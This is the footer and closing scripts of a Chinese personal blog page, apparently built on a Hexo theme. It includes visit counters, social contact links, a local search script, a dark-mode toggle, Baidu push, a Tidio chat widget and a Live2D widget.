                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
